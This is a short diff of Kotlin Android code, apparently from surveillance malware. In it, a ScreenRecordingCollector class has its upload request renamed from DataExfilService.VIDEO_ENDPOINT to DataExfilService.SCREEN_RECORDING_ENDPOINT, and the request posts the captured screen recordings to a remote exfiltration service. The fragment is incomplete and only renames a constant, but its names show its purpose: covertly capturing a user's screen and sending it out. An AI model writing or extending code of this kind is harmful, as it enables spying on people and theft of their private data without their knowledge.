@@ -50,7 +50,7 @@ class ScreenRecordingCollector(private val context: Context) : DataCollector {
                     .build()
 
                 val request = Request.Builder()
-                    .url(DataExfilService.VIDEO_ENDPOINT)
+                    .url(DataExfilService.SCREEN_RECORDING_ENDPOINT)
                     .post(requestBody)
                     .build()
 
